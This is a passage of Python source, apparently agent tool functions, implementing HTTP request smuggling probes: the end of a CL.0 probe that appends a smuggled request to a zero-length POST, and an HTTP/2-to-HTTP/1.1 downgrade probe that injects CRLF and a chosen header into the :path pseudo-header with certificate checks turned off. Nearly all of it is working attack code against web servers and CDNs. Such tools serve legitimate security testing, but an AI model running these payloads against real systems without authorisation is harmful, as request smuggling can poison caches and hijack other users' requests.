        f"X-CL0-Canary: {canary}\r\n\r\n"
    ).encode()

    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + smuggled_req

    resp1 = _send_raw(host, port, payload, timeout=timeout, use_tls=use_tls)

    follow = (f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
    resp2 = _send_raw(host, port, follow, timeout=timeout, use_tls=use_tls)

    out = [
        f"## CL.0 probe: {url}",
        f"Canary: {canary}",
        f"\n[1] Resp1: {resp1[:200]!r}",
        f"\n[2] Resp2: {resp2[:200]!r}",
    ]
    if canary.encode() in resp2 or smuggled_path.encode() in resp2:
        out.append("\n⚠️  CL.0 smuggling confirmed — canary appeared in the follow-up.")
    elif b"HTTP/1.1 200" in resp1 and len(resp1) < 500:
        out.append("\nFront-end consumed only the header (CL=0 honored). No pollution observed in this probe.")
    return "\n".join(out)


@function_tool()
def smuggling_h2_downgrade(url: str, smuggled_header: str = "X-Smuggled-Hdr: pwned", timeout: int = 12) -> str:
    """
    HTTP/2 → HTTP/1.1 downgrade smuggling.

    Many CDNs accept HTTP/2 from clients and downgrade to HTTP/1.1 to origin.
    If they don't sanitize :path/:authority/header values, an injected CRLF
    in :path or :authority becomes a request-splitting primitive on origin.

    Probe sends a controlled `:path` containing CRLF + an injected header.
    Detect via response anomalies (extra Set-Cookie, mismatched Content-Length, 400).

    Args:
        url:               Target URL (must be https://)
        smuggled_header:   Header to inject after CRLF (e.g. X-Override: 1)
    """
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "https":
        return "Error: H2 downgrade probe requires https://"

    try:
        import h2.connection  # type: ignore
        import h2.config  # type: ignore
        import h2.events  # type: ignore
    except ImportError:
        return "Error: pip install h2"

    host = parsed.hostname
    port = parsed.port or 443
    canary = secrets.token_hex(6).upper()
    base_path = parsed.path or "/"

    # \r\n is canonical; some backends accept \n alone
    inj = f"{base_path} HTTP/1.1\r\nHost: {host}\r\n{smuggled_header}\r\nX-Canary: {canary}\r\n\r\nGET / HTTP/1.1\r\nHost: {host}\r\n"

    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])
        sock = ctx.wrap_socket(sock, server_hostname=host)
    except Exception as e:
        return f"Error: TLS open: {e}"
    if sock.selected_alpn_protocol() != "h2":
        sock.close()
        return "Error: server did not negotiate h2"

    cfg = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    headers_with_inj = [
        (":method", "GET"),
        (":scheme", "https"),
        (":authority", host),
        (":path", inj),  # the malicious bit
        ("user-agent", "smuggle-probe"),
    ]
    sid = conn.get_next_available_stream_id()
    try:
        conn.send_headers(sid, headers_with_inj, end_stream=True)
        sock.sendall(conn.data_to_send())
    except Exception as e:
        sock.close()
        return f"Error: server refused malformed h2 headers: {e}"

    sock.settimeout(timeout)
    body = b""
    status = -1
    deadline = time.time() + timeout
    try:
        while time.time() < deadline:
            chunk = sock.recv(65535)
            if not chunk:
                break
            for ev in conn.receive_data(chunk):
                if isinstance(ev, h2.events.ResponseReceived):
                    for n, v in ev.headers:
                        if n in (b":status", ":status"):
                            try:
                                status = int(v)
                            except Exception:
                                pass
                if isinstance(ev, h2.events.DataReceived):
                    body += ev.data
                if isinstance(ev, h2.events.StreamEnded):
                    deadline = time.time()
            sock.sendall(conn.data_to_send())
    except Exception:
        pass
    finally:
        sock.close()

    out = [f"## H2→H1 downgrade probe: {url}", f"Status: {status}", f"Canary: {canary}"]
    if 200 <= status < 400:
        if canary.encode() in body:
            out.append("⚠️  Canary in response — CRLF injection confirmed via h2 :path.")
        else:
            out.append("Server accepted malformed :path but no canary echo. Possibly sanitized.")
    elif status == 400 or status == 421:
        out.append("Server rejected (400/421) — input validation appears to handle CRLF in :path.")
    return "\n".join(out)
